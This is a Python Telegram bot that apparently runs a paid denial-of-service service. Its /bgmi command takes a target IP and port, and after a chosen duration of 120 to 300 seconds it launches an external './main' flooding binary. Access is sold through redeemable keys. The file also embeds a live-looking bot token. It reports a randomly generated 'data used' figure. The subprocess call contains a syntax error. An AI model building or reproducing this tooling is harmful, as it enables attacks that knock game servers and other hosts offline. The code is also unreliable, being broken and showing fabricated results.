import subprocess
import time
import random
import string
import json
import os
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Token and Owner ID
BOT_TOKEN = "7327182448:AAGyikpgIKjKF6WQKrY1Y8xF62wFmosvCws"  # <--- Replace with your real token
OWNER_ID = 5879359815             # <--- Your Telegram ID

REDEEM_KEYS = {}  # key -> expiry_seconds
AUTHORIZED_USERS = {}  # user_id -> expiry_timestamp

AUTHORIZED_USERS_FILE = "authorized.json"

# Preset Durations
DURATIONS = {
    "6h": 6,
    "1d": 24,
    "3d": 72,
    "7d": 168
}

def generate_key(duration_hours):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    expire_seconds = int(duration_hours * 3600)
    REDEEM_KEYS[key] = expire_seconds
    return key

def load_authorized_users():
    if os.path.exists(AUTHORIZED_USERS_FILE):
        with open(AUTHORIZED_USERS_FILE, "r") as f:
            try:
                users = json.load(f)
                return {int(k): v for k, v in users.items()}
            except json.JSONDecodeError:
                return {}
    return {}

def save_authorized_users():
    with open(AUTHORIZED_USERS_FILE, "w") as f:
        json.dump(AUTHORIZED_USERS, f)

def is_authorized(user_id):
    now = int(time.time())
    if user_id in AUTHORIZED_USERS:
        expiry = AUTHORIZED_USERS[user_id]
        if expiry > now:
            return True
        else:
            del AUTHORIZED_USERS[user_id]
            save_authorized_users()
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome! Please redeem a key to use the bot.", parse_mode=ParseMode.MARKDOWN)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """Available Commands:

/bgmi [ip] [port] - Start attack (Requires valid key)
/genkey [6h|1d|3d|7d] - Generate redeem key (Owner only)
/redeem [key] - Redeem key for access
/ping - Check bot speed
/broadcast [message] - Owner only
"""
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = await update.message.reply_text("Pinging...")
    latency = (message.date - update.message.date).total_seconds() * 1000
    await message.edit_text(f"Bot speed: {int(latency)} ms")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Only owner can generate keys.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Usage: /genkey [6h|1d|3d|7d]")
        return

    duration = context.args[0]
    if duration not in DURATIONS:
        await update.message.reply_text("Invalid duration! Use: 6h, 1d, 3d, or 7d.")
        return

    hours = DURATIONS[duration]
    key = generate_key(hours)
    await update.message.reply_text(f"Generated Key: `{key}`\nValid for {duration}.", parse_mode=ParseMode.MARKDOWN)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Please provide a key to redeem.")
        return

    key = context.args[0]
    if key in REDEEM_KEYS:
        duration_seconds = REDEEM_KEYS[key]
        expiry_timestamp = int(time.time()) + duration_seconds
        AUTHORIZED_USERS[update.effective_user.id] = expiry_timestamp
        save_authorized_users()
        del REDEEM_KEYS[key]
        expire_time = datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')
        await update.message.reply_text(f"Key redeemed successfully!\nAccess valid until: `{expire_time}`", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("Invalid or already used key.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Only the owner can broadcast messages.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /broadcast [your message]")
        return

    message = ' '.join(context.args)
    success = 0
    failed = 0

    now = int(time.time())
    for user_id, expiry in list(AUTHORIZED_USERS.items()):
        if expiry < now:
            del AUTHORIZED_USERS[user_id]
            continue

        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 Broadcast:\n\n{message}")
            success += 1
        except Exception:
            failed += 1

    save_authorized_users()
    await update.message.reply_text(f"Broadcast finished!\n✅ Success: {success}\n❌ Failed: {failed}")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID and not is_authorized(user_id):
        await update.message.reply_text("You must redeem a valid key first to use this command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /bgmi [ip] [port]")
        return

    ip, port = context.args
    context.user_data["bgmi_ip"] = ip
    context.user_data["bgmi_port"] = port

    keyboard = [
        [InlineKeyboardButton("120 seconds", callback_data="bgmi_120")],
        [InlineKeyboardButton("180 seconds", callback_data="bgmi_180")],
        [InlineKeyboardButton("250 seconds", callback_data="bgmi_250")],
        [InlineKeyboardButton("300 seconds", callback_data="bgmi_300")]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select the attack duration:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    if user_id != OWNER_ID and not is_authorized(user_id):
        await query.edit_message_text("Authorization expired. Please redeem a new key.")
        return

    data = query.data
    if not data.startswith("bgmi_"):
        await query.edit_message_text("Invalid selection.")
        return

    selected_time = int(data.split("_")[1])
    ip = context.user_data.get("bgmi_ip")
    port = context.user_data.get("bgmi_port")

    if not ip or not port:
        await query.edit_message_text("No IP or Port set. Please use /bgmi again.")
        return

    await query.edit_message_text(text=f"**Attack started for {selected_time} seconds!**", parse_mode=ParseMode.MARKDOWN)

    try:
        proc = subprocess.Popen(["./main", ip, port, str(selected_time), 1024 "1650"])
        proc.wait()

        data_used = random.randint(50, 200)
        await query.message.reply_text(f"**Attack finished!**\nData used: {data_used} MB", parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await query.message.reply_text(f"Error during attack: {e}")

if __name__ == "__main__":
    AUTHORIZED_USERS = load_authorized_users()

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot is running...")
    app.run_polling()